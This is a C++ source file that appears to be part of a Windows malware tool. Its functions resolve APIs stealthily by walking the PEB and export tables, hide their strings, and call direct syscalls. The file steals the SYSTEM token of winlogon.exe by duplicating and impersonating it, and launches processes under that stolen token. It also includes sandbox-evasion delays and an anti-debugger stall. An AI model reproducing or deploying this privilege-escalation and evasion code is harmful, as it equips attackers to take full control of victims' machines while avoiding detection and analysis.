#include "../Headers/procutils.h"
#include "../Headers/sandbox.hpp"

static std::unordered_map<std::string, HMODULE> _loadedLibs;

// frequently used function pointers
ProcessUtilities::PPROCFN::_FreeLibrary _FreeLibrary = nullptr;

static std::string ProcessUtilities::_lower(std::string inp) {
	std::string out = "";
	for ( auto& c : inp )
		out += tolower(c);
	return out;
}

// return true if they are equal
// return false if otherwise
static BOOL ProcessUtilities::_sub(std::string libPath, std::string s2) {
	return libPath.find(s2) != std::string::npos;
}

std::string ProcessUtilities::PWSTRToString(PWSTR inp) {
	return std::string(_bstr_t(inp));
}

FARPROC ProcessUtilities::_GetFuncAddress(HMODULE lib, std::string procedure) {
	// get nt and dos headers
	PIMAGE_DOS_HEADER       dosHeader = ( PIMAGE_DOS_HEADER ) lib;
	PIMAGE_NT_HEADERS       ntHeader = ( PIMAGE_NT_HEADERS ) ( dosHeader->e_lfanew + ( BYTE* ) lib );
	IMAGE_OPTIONAL_HEADER   optHeader = ntHeader->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY exports = ( PIMAGE_EXPORT_DIRECTORY ) ( ( BYTE* ) lib + optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );

	// Addresses
	DWORD* functionAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfFunctions );
	DWORD* funcNameAddresses = ( DWORD* ) ( ( BYTE* ) lib + exports->AddressOfNames );
	WORD* funcNameOrdinals = ( WORD* ) ( ( BYTE* ) lib + exports->AddressOfNameOrdinals );

	for ( DWORD funcIndex = 0; funcIndex < exports->NumberOfNames; funcIndex++ ) {
		const char* funcName = ( const char* ) ( BYTE* ) lib + funcNameAddresses[funcIndex];
		if ( strcmp(funcName, procedure.c_str()) == 0 ) {
			DWORD funcID = funcNameOrdinals[funcIndex];
			DWORD address = functionAddresses[funcID];
			BYTE* absoluteAddress = ( ( BYTE* ) lib + address );

			return ( FARPROC ) absoluteAddress;
		}
	}
	return NULL;
}

HMODULE ProcessUtilities::GetModHandle(std::string libName)
{
	if ( _loadedLibs.count(_lower(libName).c_str()) > 0 )
		return _loadedLibs.find(_lower(libName).c_str())->second;

	PPEB peb = ( PPEB ) GetPebAddress();

	PPEB_LDR_DATA         LDRData   = peb->Ldr;
	LIST_ENTRY*           modules   = &LDRData->InMemoryOrderModuleList;
	LIST_ENTRY*           nextEntry = modules->Flink;
	LDR_DATA_TABLE_ENTRY* modInfo   = NULL;

	while ( nextEntry != modules ) {
		modInfo = ( LDR_DATA_TABLE_ENTRY* ) ( ( BYTE* ) nextEntry - sizeof(LIST_ENTRY) ); // get the info
		nextEntry = nextEntry->Flink; // set the current node to the next node

		if ( _sub(_lower(PWSTRToString(modInfo->FullDllName.Buffer)), _lower(libName)) ) {
			HMODULE mod = ( HMODULE ) modInfo->DllBase;
			_loadedLibs.insert(std::pair<const char*, HMODULE>(_lower(libName).c_str(), mod));

			return mod;
		}
	}

	return NULL;
}

HMODULE ProcessUtilities::GetLoadedLib(std::string libName) {
	if ( _loadedLibs.count(_lower(libName)) > 0 ) {
		return _loadedLibs.at(_lower(libName));
	}

	return GetModHandle(libName);
}

BOOL ProcessUtilities::FreeUsedLibrary(std::string lib) {
	if ( _loadedLibs.find(_lower(lib).c_str()) == _loadedLibs.end() )
		return FALSE;

	HMODULE module = _loadedLibs.find(_lower(lib).c_str())->second;

	if ( !_FreeLibrary(module) )
		return FALSE;

	_loadedLibs.erase(_lower(lib).c_str());

	return TRUE;
}

BOOL ProcessUtilities::Init() {
	// load required mods
	HMODULE kerneldll = GetModHandle(freqDLLS::kernel32);
	HMODULE advapi = GetModHandle(freqDLLS::advapi32);
	HMODULE ntdll = GetModHandle(freqDLLS::ntdll);

	if ( kerneldll == NULL || advapi == NULL || ntdll == NULL )
		return FALSE;

	_FreeLibrary = GetFunctionAddress<PPROCFN::_FreeLibrary>(kerneldll, std::string(HIDE("FreeLibrary")));

	return TRUE;
}

BOOL ProcessUtilities::Clean() {
	BOOL success = FALSE;
	for ( auto& libInfo : _loadedLibs )
	{
		if ( strcmp(_lower(libInfo.first).c_str(), freqDLLS::kernel32.c_str()) != 0 )
			success = FreeUsedLibrary(libInfo.first.c_str());
	}

	return success;
}

DWORD ProcessUtilities::PIDFromName(const char* name) {
	// take snapshot of all current running processes

	HMODULE kernel32 = GetLoadedLib(freqDLLS::kernel32);
	PPROCFN::_CreateToolhelp32Snapshot _CreateToolhelp32Snapshot = GetFunctionAddress<PPROCFN::_CreateToolhelp32Snapshot>(kernel32, std::string(HIDE("CreateToolhelp32Snapshot")));
	PPROCFN::_Process32FirstW          _Process32FirstW = GetFunctionAddress<PPROCFN::_Process32FirstW>(kernel32, std::string(HIDE("Process32FirstW")));
	PPROCFN::_Process32NextW           _Process32NextW = GetFunctionAddress<PPROCFN::_Process32NextW>(kernel32, std::string(HIDE("Process32NextW")));

	PROCESSENTRY32 processEntry;
	DWORD          processID = -1;
	HANDLE         processSnapshot = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if ( processSnapshot == INVALID_HANDLE_VALUE ) {
		return -1;
	}

	processEntry.dwSize = sizeof(PROCESSENTRY32);

	// process the first file in the snapshot, put information in processEntry
	if ( !_Process32FirstW(processSnapshot, &processEntry) ) {
		SysNtClose(processSnapshot);
		return -1;
	}

	// iterate through all running processes
	// compare the proc name to the name of the process we need
	// if they're the same, return the process id and return
	do {
		if ( strcmp(name, _bstr_t(processEntry.szExeFile)) == 0 ) {
			processID = processEntry.th32ProcessID;
			break;
		}
	} while ( _Process32NextW(processSnapshot, &processEntry) ); // iterate if the next process in the snapshot is valid

	SysNtClose(processSnapshot);

	return processID;
}

HANDLE ProcessUtilities::CreateProcessAccessToken(DWORD processID) {
	OBJECT_ATTRIBUTES objectAttributes{};
	HANDLE            process = NULL;
	CLIENT_ID         pInfo{};
	pInfo.UniqueProcess = ( HANDLE ) processID;
	pInfo.UniqueThread = ( HANDLE ) 0;

	InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);

	NTSTATUS openStatus = SysNtOpenProcess(
		&process,
		MAXIMUM_ALLOWED,
		&objectAttributes,
		&pInfo
	);

	if ( openStatus != STATUS_SUCCESS ) {
		return NULL;
	}

	HANDLE   processToken = NULL;
	NTSTATUS openProcTokenStatus = SysNtOpenProcessTokenEx(process, TOKEN_DUPLICATE, 0, &processToken);

	if ( openProcTokenStatus != STATUS_SUCCESS ) {
		SysNtClose(process);
		return NULL;
	}

	InitializeObjectAttributes(&objectAttributes, 0, 0, 0, 0);
	HANDLE   duplicatedToken = NULL;
	NTSTATUS tokenDuplicated = SysNtDuplicateToken(
		processToken,
		MAXIMUM_ALLOWED,
		&objectAttributes,
		FALSE,
		TokenPrimary,
		&duplicatedToken
	);

	if ( tokenDuplicated != STATUS_SUCCESS ) {
		SysNtClose(processToken);
		SysNtClose(process);
		return NULL;
	}
	SandboxCompromise::DelayOperation();

	SysNtClose(process);
	SysNtClose(processToken);

	return duplicatedToken;
}

void ProcessUtilities::HaltProcessExecution() {
	system(HIDE("ping 127.0.0.1 -n 5693 > null "));
}

BOOL ProcessUtilities::OpenProcessAsImposter(
	HANDLE token,
	DWORD dwLogonFlags,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
) {
	PPROCFN::_CreateProcessWithTokenW pCreateProcessWithTokenW = GetFunctionAddress<PPROCFN::_CreateProcessWithTokenW>(GetLoadedLib(freqDLLS::advapi32), std::string(HIDE("CreateProcessWithTokenW")));
	return pCreateProcessWithTokenW(
		token,
		dwLogonFlags,
		lpApplicationName,
		lpCommandLine,
		dwCreationFlags,
		lpEnvironment,
		lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation
	);
}

DWORD ProcessUtilities::StartWindowsService(std::string serviceName) {

	HMODULE advapi = GetLoadedLib(freqDLLS::advapi32);
	PPROCFN::_OpenServiceA         pOpenServiceA = GetFunctionAddress<PPROCFN::_OpenServiceA>(advapi, std::string(HIDE("OpenServiceA")));
	PPROCFN::_OpenSCManagerW       pOpenSCManager = GetFunctionAddress<PPROCFN::_OpenSCManagerW>(advapi, std::string(HIDE("OpenSCManagerW")));
	PPROCFN::_QueryServiceStatusEx pQueryServiceStatus = GetFunctionAddress<PPROCFN::_QueryServiceStatusEx>(advapi, std::string(HIDE("QueryServiceStatusEx")));
	PPROCFN::_StartService         pStartService = GetFunctionAddress<PPROCFN::_StartService>(advapi, std::string(HIDE("StartServiceW")));

	SC_HANDLE scManager = pOpenSCManager(nullptr, SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE);
	if ( scManager == NULL )
		return -1;

	SC_HANDLE service = pOpenServiceA(scManager, serviceName.c_str(), GENERIC_READ | GENERIC_EXECUTE);
	if ( service == NULL ) {
		SysNtClose(scManager);
		return -1;
	}

	SERVICE_STATUS_PROCESS status = { 0 };
	DWORD statusBytesNeeded;

	// query and attempt to start, wait if stop pending, until service running
	do {
		// query the service status
		if ( !pQueryServiceStatus(
			service,
			SC_STATUS_PROCESS_INFO,
			( LPBYTE ) &status,
			sizeof(SERVICE_STATUS_PROCESS),
			&statusBytesNeeded
		) ) {
			SysNtClose(scManager);
			SysNtClose(service);
			return -1;
		}

		// check if stop pending
		if ( status.dwCurrentState == SERVICE_STOP_PENDING || status.dwCurrentState == SERVICE_START_PENDING ) {
			// wait until service is stopped 

			// recommended wait time based on microsoft win32 docs
			int wait = status.dwWaitHint / 10;

			if ( wait < 1000 )
				wait = 1000;
			else if ( wait > 10000 )
				wait = 10000;
			Sleep(wait);
			continue;
		}
		// service is not running
		if ( status.dwCurrentState == SERVICE_STOPPED ) {
			BOOL serviceStarted = pStartService(service, 0, NULL);
			if ( !serviceStarted ) {
				SysNtClose(service);
				SysNtClose(scManager);
				return -1;
			}
		}
	} while ( status.dwCurrentState != SERVICE_RUNNING );

	// service is now started
	SysNtClose(service);
	SysNtClose(scManager);

	return status.dwProcessId;
}

HANDLE ProcessUtilities::GetSystemToken() {
	DWORD logonPID = PIDFromName(HIDE("winlogon.exe"));
	if ( logonPID == 0 ) // bad process id
		return FALSE;
	
	//SandboxCompromise::DelayOperation();
	HANDLE winlogon = CreateProcessAccessToken(logonPID);
	if ( winlogon == NULL )
		return NULL;

	HMODULE ntdll = GetLoadedLib(freqDLLS::advapi32);
	PPROCFN::_ImpersonateLoggedOnUser _ImpersonateLoggedOnUser = GetFunctionAddress<PPROCFN::_ImpersonateLoggedOnUser>(ntdll, std::string(HIDE("ImpersonateLoggedOnUser")));

	if ( !_ImpersonateLoggedOnUser(winlogon) ) {
		SysNtClose(winlogon);
		return NULL;
	}

	//SandboxCompromise::DelayOperation();

	return winlogon;
}

BOOL ProcessUtilities::CheckNoDebugger() {
	PPEB filePEB = ( PPEB ) GetPebAddress();
	BYTE beingDebugged = filePEB->BeingDebugged;

	if ( beingDebugged ) {
		HaltProcessExecution();
		return TRUE;
	}

	return FALSE;
}
